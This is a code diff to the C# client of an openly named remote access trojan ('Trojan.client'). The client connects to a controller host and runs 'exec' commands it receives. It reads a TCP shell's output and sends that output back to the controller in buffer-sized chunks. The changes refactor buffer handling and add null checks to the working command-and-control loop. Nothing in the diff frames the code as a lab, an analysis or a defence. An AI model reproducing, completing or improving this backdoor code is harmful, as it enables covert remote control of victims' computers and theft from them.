@@ -55,7 +55,7 @@ namespace Trojan.client
         {
             if (socketSetup.sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(socketSetup.sock));
 
-            byte[] tmpBuffer = new byte[socketSetup.buffSize];
+            byte[] tmpBuffer = new byte[socketSetup.sock.ReceiveBufferSize];
 
             Task ReceiveTask = socketSetup.sock.ReceiveAsync(tmpBuffer, SocketFlags.None);
 
@@ -69,13 +69,13 @@ namespace Trojan.client
 
                     if (TruncationCheckCommand(message, 0, 4) == "exec")
                     {
-                        string command_parsed = CommandExtension.CheckForCommand(message);
-                        if (command_parsed != "")
+                        string[] command_parsed = CommandExtension.CheckForCommand(message);
+                        if (command_parsed[0] != "")
                         {
-                            string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
+                            string Command_Data = CommandExtension.ExecuteCommand(ref Connector, ref command_parsed);
                             await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
                         }
-                        else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
+                        else if (command_parsed[0] == "" && ReceiveTimeout == Timeout.Infinite)
                         {
                             await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
                         }
@@ -92,40 +92,46 @@ namespace Trojan.client
 
                         StringBuilder OutputData = new StringBuilder();
 
-                        string? line;
+                        string? line = null;
                         while(true)
                         {
                             line = tcpShell.OutputStream.ReadLine();
-                            if (line.EndsWith("<EOF>")) { break; }
+                            if (line != null && line.EndsWith("<EOF>")) { break; }
 
                             OutputData.AppendLine("\t" + line);
                         }
 
-                        if (OutputData.Length > BUFFSIZE)
+                        if (Connector.sock != null)
                         {
-                            StringBuilder split_OutputData = new StringBuilder((int)(BUFFSIZE));
-
-                            int offset = 0;
-                            int dataLeft = 0;
-                            int charsRead = 1024;
-                            while (offset < OutputData.Length)
+                            if (OutputData.Length > Connector.sock.ReceiveBufferSize)
                             {
-                                split_OutputData.Clear();
-                                dataLeft = OutputData.Length - offset;
+                                StringBuilder split_OutputData = new StringBuilder(Connector.sock.ReceiveBufferSize);
 
-                                if (dataLeft < 1024)
-                                    charsRead = dataLeft;
+                                if (Connector.sock != null)
+                                {
+                                    int offset = 0;
+                                    int dataLeft = 0;
+                                    int charsRead = Connector.sock.ReceiveBufferSize;
+                                    while (offset < OutputData.Length)
+                                    {
+                                        split_OutputData.Clear();
+                                        dataLeft = OutputData.Length - offset;
 
-                                split_OutputData.Append(StringExtensions.PartitionAsString(OutputData.ToString().Substring(offset, charsRead), charsRead));
+                                        if (dataLeft < Connector.sock.ReceiveBufferSize)
+                                            charsRead = dataLeft;
 
-                                offset += charsRead;
+                                        split_OutputData.Append(StringExtensions.PartitionAsString(OutputData.ToString().Substring(offset, charsRead), charsRead));
 
-                                await Send_Socket(socketSetup.sock, split_OutputData.ToString(), SEND_TIMEOUT);
+                                        offset += charsRead;
+
+                                        await Send_Socket(socketSetup.sock, split_OutputData.ToString(), SEND_TIMEOUT);
+                                    }
+                                }
                             }
-                        }
-                        else
-                        {
-                            await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
+                            else
+                            {
+                                await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
+                            }
                         }
 
                         await Send_Socket(socketSetup.sock, "<EODM>", SEND_TIMEOUT);
@@ -140,11 +146,13 @@ namespace Trojan.client
             }
         }
 
-        public async Task Init_Client(ushort port, uint buffSize)
+        public async Task Init_Client()
         {
             if (HOST != null)
             {
-                Connector = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
+                Connector = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), PORT, BUFFSIZE));
+                if (Connector.sock == null) throw new ExceptionHandler("[-] Connector socket can not be null : " + nameof(Connector.sock));
+                Connector.sock.ReceiveBufferSize = (int)(BUFFSIZE);
                 await _SocketOperations.Connect_Socket(Connector);
                 Task ConnectorReceiver = Task.Factory.StartNew(() => Receive_Socket(Connector, Timeout.Infinite));
             }
@@ -154,7 +162,7 @@ namespace Trojan.client
         public static async Task Main()
         {
             Client client = new Client();
-            await client.Init_Client(PORT, BUFFSIZE);
+            await client.Init_Client();
 
             while (true)
             {
